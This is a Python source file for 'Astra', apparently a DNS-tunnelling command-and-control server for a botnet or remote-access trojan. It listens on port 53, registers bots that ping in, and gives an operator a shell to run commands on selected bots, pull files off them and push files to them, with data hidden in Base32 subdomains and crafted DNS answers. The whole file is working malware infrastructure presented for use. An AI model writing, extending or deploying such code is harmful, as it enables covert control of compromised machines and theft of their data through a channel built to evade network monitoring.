import threading
import socket
from base64 import b32decode
from time import sleep
from datetime import datetime

def decode32str(encoded_string):
    decoded_bytes = b32decode(encoded_string.encode('utf-8'))
    decoded_string = decoded_bytes.decode('utf-8')
    return decoded_string

def decode32byte(encoded_string):
    decoded_bytes = b32decode(encoded_string.encode('utf-8'))
    return decoded_bytes

def current_timestamp():
    return (datetime.now() - datetime(1970, 1, 1)).total_seconds()

class PrettyAstra(object):
    def shell_prompt(self):
        return f"[✨] Astra shell ~> "
    def print(self, msg, status = None, newline = False):
        if newline:
            newline = "\n"
        else:
            newline = ''
        if status == "ok":
            print(f"{newline}[✅] {msg}", flush=True)
        if status == "err":
            print(f"{newline}[🚫] {msg}", flush=True)
        if status == None:
            print(f"{newline}[✨] {msg}", flush=True)
        if newline != '':
            print(f"{self.shell_prompt()}", end='', flush=True)
    def input(self):
        return input(self.shell_prompt())

class AstraServer(PrettyAstra):
    def __init__(self):
        self.bot_proc = {
            'transfer_data': [],
            'transfer_data_end': [],
            'response_data': [],
            'temp_data':None,
            'transfer_status': False,
            'lastping':None
        }
        self.run_event = threading.Event()
        self.run_event.set()
        self.bot_list = {}
        self.selected_bot = None
    
    def kill(self):
        self.run_event.clear()

    def set_temp_data(self, data):
        self.bot_list[self.selected_bot]['temp_data'] = data

    def set_transfer_data(self, transfer_data):
        self.bot_list[self.selected_bot]['transfer_data'] = transfer_data
    
    def set_transfer_status(self, status):
        self.bot_list[self.selected_bot]['transfer_status'] = status
    
    def get_transfer_status(self):
        return self.bot_list[self.selected_bot]['transfer_status']

    def get_response_data(self):
        return self.bot_list[self.selected_bot]['response_data']
    
    def clear_response_data(self):
        self.bot_list[self.selected_bot]['response_data'] = []
    
    def get_bot_list(self):
        return self.bot_list
    
    def decode_text(self, text):
        return ''.join(list(map(chr,text)))
    
    def select_bot(self, bot):
        if bot in self.bot_list.keys():
            self.selected_bot = bot
            return True
        else:
            return False
    
    def get_selected_bot(self):
        return self.selected_bot
    
    def check_ping_thread(self):
        while True:
            del_bots = []
            for bot_name, bot_data in self.bot_list.items():
                if bot_data['lastping'] != None:
                    if current_timestamp() - bot_data['lastping'] > 3:
                        self.print(f"Bot offline [{bot_name}]", "err", True)
                        del_bots.append(bot_name)
            for bot in del_bots:
                del self.bot_list[bot_name]
                if self.selected_bot == bot_name:
                    self.selected_bot = None
            sleep(1)

    def start_dns_server(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', 53))
        while self.run_event.is_set():
            response_data = bytearray([0xff]) # response - OK
            data, addr = sock.recvfrom(1024)
            domain = self.extract_domain(data)
            response_shell = self.shell_extract(domain)
            if response_shell != None:
                response_data = bytearray.fromhex(' '.join(response_shell))
            response = self.create_dns_response(data, response_data)
            sock.sendto(response, addr)

    def shell_extract(self, bot_request):
        # "BOTID-MSG_TYPE-MSG_STATUS-MSG"
        bot_request = bot_request[:-4].split('-')
        bot_id = bot_request[0]
        bot_msg_status = bot_request[1]
        bot_msg_type = bot_request[2]
        bot_msg = bot_request[3]
        if bot_msg_status == "p": # ping
            #print(self.bot_list)
            if not bot_id in self.bot_list:
                self.bot_list[bot_id] = self.bot_proc
                self.print(f'New bot [{bot_id}]', 'ok', True)
            self.bot_list[bot_id]['lastping'] = current_timestamp()
            if self.selected_bot != None:
                response_data = None
                if self.bot_list[self.selected_bot]['transfer_data'] != []:
                    if self.bot_list[self.selected_bot]['transfer_data_end'] == []:
                        self.bot_list[self.selected_bot]['transfer_data_end'] = self.bot_list[self.selected_bot]['transfer_data'][-2:]
                        self.bot_list[self.selected_bot]['transfer_data'] = self.bot_list[self.selected_bot]['transfer_data'][:-2]
                    response_data = self.bot_list[self.selected_bot]['transfer_data'][:32]
                    del self.bot_list[self.selected_bot]['transfer_data'][:32]
                else:
                    if self.bot_list[self.selected_bot]['transfer_data_end'] != []:
                        response_data = self.bot_list[self.selected_bot]['transfer_data_end']
                        self.bot_list[self.selected_bot]['transfer_data'] = []
                        self.bot_list[self.selected_bot]['transfer_data_end'] = []
                        self.bot_list[self.selected_bot]['transfer_status'] = False
                if response_data != None:
                    return response_data
            return None
        if bot_msg_status == "d": # file transfer
            if bot_msg_type == 't':
                self.bot_list[self.selected_bot]['response_data'].extend(bytearray(decode32byte(bot_msg)))
            if bot_msg_type == 'e':
                filename = self.bot_list[self.selected_bot]['temp_data'].split('/')[-1]
                self.print(f"File transfer ended. [{filename}], saved to transfers/{filename}")
                with open(f"transfers/{filename}", "wb") as file:
                    file.write(bytearray(self.bot_list[self.selected_bot]['response_data']))
                self.bot_list[self.selected_bot]['response_data'] = []
                self.bot_list[self.selected_bot]['temp_data'] = None
                self.bot_list[self.selected_bot]['transfer_status'] = False
        if bot_msg_status == "u": # file transfer
            if bot_msg_type == 't':
                self.bot_list[self.selected_bot]['response_data'].extend(bytearray(decode32byte(bot_msg)))
            if bot_msg_type == 'e':
                filename = self.bot_list[self.selected_bot]['temp_data']
                self.print(f"File upload ended. [{filename}]")
                self.bot_list[self.selected_bot]['response_data'] = []
                self.bot_list[self.selected_bot]['temp_data'] = None
                self.bot_list[self.selected_bot]['transfer_status'] = False
        if bot_msg_status == "t": # text message
            if bot_msg_type == 't':
                self.bot_list[self.selected_bot]['response_data'].extend(bytearray(decode32byte(bot_msg)))
            if bot_msg_type == 'e':
                exec_ret = self.decode_text(self.bot_list[self.selected_bot]['response_data'])
                self.print(f"Exec return:\n{exec_ret}", 'ok', True)
                self.bot_list[self.selected_bot]['response_data'] = []
                self.bot_list[self.selected_bot]['transfer_status'] = False
        return None

    def extract_domain(self, data):
        offset = 12
        domain = ''
        while True:
            length = data[offset]
            offset += 1
            if length == 0:
                break
            elif length >= 192:
                offset += 1
                break
            else:
                domain += data[offset:offset+length].decode() + '.'
                offset += length
        return domain.rstrip('.')

    def create_dns_response(self, request, response_data):
        response = request[:2]
        flags = bytearray.fromhex('81 80')
        response += flags
        response += bytearray.fromhex('00 01')
        response += bytearray.fromhex('00 01')
        response += bytearray.fromhex('00 00')
        response += bytearray.fromhex('00 00')
        offset = 12
        while True:
            length = request[offset]
            offset += 1
            if length == 0:
                break
            elif length >= 192:
                offset += 1
                break
            else:
                response += bytes([length]) + request[offset:offset+length]
                offset += length
        response += bytearray.fromhex('00 01 00 01')
        response += bytearray.fromhex('C0 0C')
        response += bytearray.fromhex('00 01')
        response += bytearray.fromhex('00 01')
        response += bytearray.fromhex('00')
        # set here custom respose bytes
        response += response_data
        return response

# Пример использования


#start_dns_server(ip_domain_map)



class AstraShell(PrettyAstra):
    def __init__(self, dns_server):
        self.bytes_headers = {
            'exec_start': '00 01',
            'exec_end': '00 02',
            'download_start': '01 01',
            'download_end': '01 02',
            'upload_start': '02 01',
            'upload_end': '02 02',
        }
        self.commands = {
            'exec': self.exec_command,
            'download': self.download_file,
            'upload': self.upload_file,
            'bots': self.bot_list,
            'help': self.help,
            'bot': self.select_bot,
            'exit': self.stop
        }
        
        self.transfer_data = []
        self.dns_server = dns_server
        self.dns_server_thread = None
        self.dns_server_ping_thread = None
    
    def start_server(self):
        #self.dns_server_ping_thread = threading.Thread(target = self.dns_server.check_ping_thread)
        #self.dns_server_ping_thread.start()
        self.dns_server_thread = threading.Thread(target = self.dns_server.start_dns_server)
        self.dns_server_thread.start()
    
    def encode_string(self, message):
        return ' '.join([f'{ord(char):02x}' for char in message])
    
    def decode_string(self, message):
        return ''.join([chr(int(byte, 16)) for byte in message.split()])

    def download_file(self, cmd):
        self.transfer_data.append(self.bytes_headers['download_start'])
        self.transfer_data.append(self.encode_string(cmd))
        self.transfer_data.append(self.bytes_headers['download_end'])
        self.dns_server.set_transfer_status(True)
        self.dns_server.set_transfer_data(' '.join(self.transfer_data).split(' '))
        self.dns_server.set_temp_data(cmd)
        self.transfer_data = []
        while self.dns_server.get_transfer_status():
            sleep(1)
        response_data = self.dns_server.get_response_data()
        self.dns_server.clear_response_data()
        return True

    def upload_file(self, cmd):
        self.transfer_data.append(self.bytes_headers['upload_start'])
        filename_bytes = self.encode_string(cmd)
        filename_bytes += ('00' * (256 - len(filename_bytes)))
        self.transfer_data.append(filename_bytes)
        with open(cmd, "rb") as file:
            self.transfer_data.append(file.read())
        self.transfer_data.append(self.bytes_headers['upload_end'])
        self.dns_server.set_transfer_status(True)
        self.dns_server.set_transfer_data(' '.join(self.transfer_data).split(' '))
        self.dns_server.set_temp_data(cmd)
        self.transfer_data = []
        while self.dns_server.get_transfer_status():
            sleep(1)
        response_data = self.dns_server.get_response_data()
        self.dns_server.clear_response_data()
        return True
        
    def bot_list(self, cmd):
        self.print(f"Bot list: {', '.join(self.dns_server.get_bot_list().keys())}")
        return None
    def select_bot(self, cmd):
        if self.dns_server.select_bot(cmd):
            self.print(f"Using bot {cmd}")
        else:
            self.print(f"Bot {cmd} not found")
        return None
    def help(self, cmd):
        self.print(f"Command list: {', '.join(self.commands.keys())}")
        return None
    
    def exec_command(self, cmd):
        self.transfer_data.append(self.bytes_headers['exec_start'])
        self.transfer_data.append(self.encode_string(cmd))
        self.transfer_data.append(self.bytes_headers['exec_end'])
        self.dns_server.set_transfer_data(' '.join(self.transfer_data).split(' '))
        self.dns_server.set_transfer_status(True)
        self.transfer_data = []
        while self.dns_server.get_transfer_status():
            sleep(1)
        response_data = self.dns_server.get_response_data()
        self.dns_server.clear_response_data()
        return True

    def shell(self):
        cmd = ''
        while True:
            cmd = self.input().split(' ', 1)
            if cmd[0] in self.commands.keys():
                cmd_data = None
                if len(cmd) == 2:
                    cmd_data = cmd[1]
                self.commands[cmd[0]](cmd_data)
            else:
                self.print("Command not found", "err")

    def start(self):
        self.start_server()
        self.shell()
    
    def stop(self, cmd):
        self.dns_server.kill()
        exit(0)
                


if __name__ == "__main__":
    server = AstraServer()
    shell = AstraShell(server)
    shell.start()